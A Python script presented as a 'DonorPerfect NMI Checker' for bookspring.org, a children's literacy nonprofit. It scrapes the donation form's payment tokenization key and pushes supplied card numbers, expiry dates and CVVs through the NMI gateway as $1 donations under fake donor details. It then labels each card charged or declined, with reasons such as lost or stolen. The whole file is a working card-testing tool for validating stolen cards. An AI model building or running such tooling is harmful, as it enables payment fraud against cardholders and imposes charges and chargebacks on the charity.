import requests
import json
import re
import random
import sys
import os
import time
import uuid
import threading
from datetime import datetime
import urllib3

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# DonorPerfect NMI Tool - bookspring.org
# Gateway: DonorPerfect + NMI
# Merchant: SafeSave

CONFIG = {
    'tokenization_key': '98AJnu-5CTm82-47pvVK-ePr2Nt',
    'org_id': 'eb1b9c87-fa91-4b36-b62b-778b6dd25bfb',
    'form_id': 'd80519dd-94d6-4839-a78f-aa6abd08414f',
    'form_name': 'Program Fee Payments',
    'form_version': 1739306579558,
    'org_name': 'BookSpring',
    'form_url': 'https://form-renderer-app.donorperfect.io/give/bookspring/program-fee-payments',
    'last_refresh': 0,
}

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
LOCK = threading.Lock()
REFRESH_INTERVAL = 300

def full_refresh():
    try:
        r = requests.get(CONFIG['form_url'], headers={'User-Agent': UA}, timeout=20)
        html = r.text
        org_match = re.search(r'"organizationId"\s*:\s*"([a-f0-9-]+)"', html)
        if org_match:
            CONFIG['org_id'] = org_match.group(1)
        form_id_match = re.search(r'"formId"\s*:\s*"([a-f0-9-]+)"', html)
        if form_id_match:
            CONFIG['form_id'] = form_id_match.group(1)
        form_name_match = re.search(r'"formName"\s*:\s*"([^"]+)"', html)
        if form_name_match:
            CONFIG['form_name'] = form_name_match.group(1)
        form_ver_match = re.search(r'"version"\s*:\s*(\d+)', html)
        if form_ver_match:
            CONFIG['form_version'] = int(form_ver_match.group(1))
        org_name_match = re.search(r'"organizationName"\s*:\s*"([^"]+)"', html)
        if org_name_match:
            CONFIG['org_name'] = org_name_match.group(1)
    except:
        pass
    try:
        gw = requests.get(
            f'https://form-renderer-api.donorperfect.io/api/gateway/organization/{CONFIG["org_id"]}',
            headers={'User-Agent': UA},
            timeout=15
        )
        gw_data = gw.json()
        new_key = gw_data.get('value', '') or gw_data.get('tokenizationKey', '')
        if new_key and isinstance(new_key, str):
            CONFIG['tokenization_key'] = new_key
    except:
        pass
    CONFIG['last_refresh'] = time.time()

def ensure_fresh():
    if time.time() - CONFIG['last_refresh'] > REFRESH_INTERVAL:
        with LOCK:
            if time.time() - CONFIG['last_refresh'] > REFRESH_INTERVAL:
                full_refresh()

def auto_refresh_loop():
    while True:
        time.sleep(REFRESH_INTERVAL)
        try:
            with LOCK:
                full_refresh()
        except:
            pass

# Initialize Refresh
full_refresh()
threading.Thread(target=auto_refresh_loop, daemon=True).start()

def classify_error(msg):
    msg_lower = msg.lower()
    if 'decline' in msg_lower or 'declined' in msg_lower:
        return f'Declined | {msg}'
    elif 'insufficient' in msg_lower:
        return f'Declined | INSUFFICIENT_FUNDS | {msg}'
    elif 'cvv' in msg_lower or 'cvc' in msg_lower or 'security code' in msg_lower:
        return f'Declined | CVV_FAILURE | {msg}'
    elif 'expired' in msg_lower:
        return f'Declined | EXPIRED_CARD | {msg}'
    elif 'invalid' in msg_lower and ('card' in msg_lower or 'number' in msg_lower):
        return f'Declined | INVALID_CARD | {msg}'
    elif 'do not honor' in msg_lower:
        return f'Declined | DO_NOT_HONOR | {msg}'
    elif 'fraud' in msg_lower:
        return f'Declined | SUSPECTED_FRAUD | {msg}'
    elif 'stolen' in msg_lower or 'lost' in msg_lower:
        return f'Declined | LOST_OR_STOLEN | {msg}'
    elif 'pickup' in msg_lower:
        return f'Declined | PICKUP_CARD | {msg}'
    elif 'limit' in msg_lower or 'exceed' in msg_lower:
        return f'Declined | EXCEED_LIMIT | {msg}'
    elif 'not permitted' in msg_lower:
        return f'Declined | TRANSACTION_NOT_PERMITTED | {msg}'
    elif 'account' in msg_lower and ('closed' in msg_lower or 'blocked' in msg_lower):
        return f'Declined | ACCOUNT_BLOCKED | {msg}'
    elif 'validation' in msg_lower:
        return f'Declined | VALIDATION_ERROR | {msg}'
    else:
        return f'Declined | {msg}'

def parse_response(resp):
    status_code = resp.status_code
    text = resp.text
    if status_code == 200:
        try:
            data = resp.json()
            if data.get('success') is True:
                return 'Charged | Donation succeeded'
            elif data.get('failure') is True or data.get('success') is False:
                err_obj = data.get('error', {})
                if isinstance(err_obj, dict):
                    err_msg = err_obj.get('message', '')
                    details = err_obj.get('details', {})
                    if isinstance(details, dict):
                        detail_msgs = list(details.values())
                        if detail_msgs:
                            err_msg = detail_msgs[0] if isinstance(detail_msgs[0], str) else json.dumps(detail_msgs[0])
                    if not err_msg:
                        err_msg = json.dumps(err_obj)[:200]
                else:
                    err_msg = str(err_obj)[:200]
                return classify_error(err_msg)
            elif 'confirmationCode' in str(data) or 'confirmation' in str(data).lower():
                return f'Charged | Donation confirmed | {json.dumps(data)[:200]}'
            else:
                return f'Charged | {json.dumps(data)[:200]}'
        except:
            if 'thank' in text.lower() or 'success' in text.lower():
                return 'Charged | Donation succeeded'
            return f'Response 200 | {text[:200]}'
    elif status_code == 400:
        try:
            data = resp.json()
            errors = data.get('errors', [])
            if isinstance(errors, list) and len(errors) > 0:
                err_msg = errors[0] if isinstance(errors[0], str) else json.dumps(errors[0])
            elif isinstance(data.get('message'), str):
                err_msg = data['message']
            elif isinstance(data.get('title'), str):
                err_msg = data['title']
            else:
                err_msg = json.dumps(data)[:200]
            return classify_error(err_msg)
        except:
            return f'Error 400 | {text[:200]}'
    elif status_code == 422:
        try:
            data = resp.json()
            errors = data.get('errors', data.get('validationErrors', []))
            if isinstance(errors, dict):
                all_errs = []
                for k, v in errors.items():
                    if isinstance(v, list):
                        all_errs.extend(v)
                    else:
                        all_errs.append(str(v))
                err_msg = '; '.join(all_errs) if all_errs else json.dumps(data)[:200]
            elif isinstance(errors, list) and len(errors) > 0:
                err_msg = errors[0] if isinstance(errors[0], str) else json.dumps(errors[0])
            else:
                err_msg = json.dumps(data)[:200]
            return classify_error(err_msg)
        except:
            return f'Validation Error | {text[:200]}'
    else:
        return f'HTTP {status_code} | {text[:200]}'

def process_nmi_card(ccx):
    """
    Processes a card via NMI Gateway.
    Returns a dictionary: {'status': 'charged'|'declined'|'error', 'message': '...'}
    """
    try:
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4:
            return {'status': 'ERROR', 'message': 'INVALID_FORMAT'}
        
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(yy) == 2:
            yy = '20' + yy
        ccexp_value = f'{mm}{yy[2:]}'

        ensure_fresh()
        tok_key = CONFIG['tokenization_key']
        cart_id = str(uuid.uuid4())

        nmi_headers = {
            'User-Agent': UA,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://secure.nmi.com',
            'Referer': 'https://secure.nmi.com/',
        }

        # 1. Create Token
        create_resp = requests.post(
            'https://secure.nmi.com/token/api/create',
            headers=nmi_headers,
            data=f'tokenizationKey={tok_key}&cartCorrelationId={cart_id}',
            timeout=15
        )
        create_data = create_resp.json()
        token_id = create_data.get('token', '')
        if not token_id or not isinstance(token_id, str):
            return {'status': 'ERROR', 'message': 'NMI Error | Could not create token'}

        nmi_json_headers = {
            'User-Agent': UA,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://secure.nmi.com',
            'Referer': 'https://secure.nmi.com/',
        }

        # 2. Save CC Number
        requests.post(
            'https://secure.nmi.com/token/api/save_multipart_token',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id,
                'data': [{'elementId': 'ccnumber', 'value': cc}]
            },
            timeout=15
        )

        # 3. Save Expiry
        requests.post(
            'https://secure.nmi.com/token/api/save_multipart_token',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id,
                'data': [{'elementId': 'ccexp', 'value': ccexp_value}]
            },
            timeout=15
        )

        # 4. Save CVV
        requests.post(
            'https://secure.nmi.com/token/api/save_multipart_token',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id,
                'data': [{'elementId': 'cvv', 'value': cvv}]
            },
            timeout=15
        )

        # 5. Lookup
        lookup_resp = requests.post(
            'https://secure.nmi.com/token/api/lookup',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id
            },
            timeout=15
        )
        lookup_data = lookup_resp.json()
        card_info = lookup_data.get('card', {})
        if not card_info.get('number'):
            return {'status': 'ERROR', 'message': 'NMI Error | Token lookup failed'}

        email = f'donor{random.randint(100, 999)}@gmail.com'
        now_str = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')

        # 6. Prepare Payload
        submission_payload = {
            'meta-data': {
                'formId': CONFIG['form_id'],
                'formVersion': CONFIG['form_version'],
                'formName': CONFIG['form_name'],
                'localDateTime': now_str,
                'hiddenFields': [],
                'organizationName': CONFIG['org_name'],
                'organizationId': CONFIG['org_id'],
            },
            'data': {
                'gift_amount': '1',
                'gift_type': 'oneTime',
                'first_name': 'John',
                'last_name': 'Smith',
                'email': email,
                'address': '123 Main St',
                'city': 'New York',
                'state': 'NY',
                'zip': '10001',
                'country': 'US',
                'phone': '',
                'employer': '',
                'payment_method': 'credit_card',
            },
            'payment-data': {
                'card': card_info,
                'token': token_id,
                'cartCorrelationId': cart_id,
                'check': lookup_data.get('check', {}),
            },
            'paypal-data': {},
        }

        submit_headers = {
            'User-Agent': UA,
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://form-renderer-app.donorperfect.io',
            'Referer': 'https://form-renderer-app.donorperfect.io/',
        }

        # 7. Submit
        submit_resp = requests.post(
            'https://form-renderer-api.donorperfect.io/api/FormSubmission',
            headers=submit_headers,
            json=submission_payload,
            timeout=30
        )

        # 8. Parse Result
        raw_result = parse_response(submit_resp)
        
        # Convert string result to Dict format
        if "Charged" in raw_result:
            return {'status': 'CHARGED', 'message': raw_result}
        elif "Declined" in raw_result:
            return {'status': 'DECLINED', 'message': raw_result}
        else:
            return {'status': 'ERROR', 'message': raw_result}

    except Exception as e:
        return {'status': 'ERROR', 'message': f'Exception: {str(e)}'}

# Main execution block for standalone testing
if __name__ == '__main__':
    print('    DonorPerfect NMI Checker - bookspring.org')
    print(f'    Merchant: SafeSave')
    print()
    card = input('  Enter card (cc|mm|yy|cvv): ').strip()
    result = process_nmi_card(card)
    print(f'  Result: {result}')
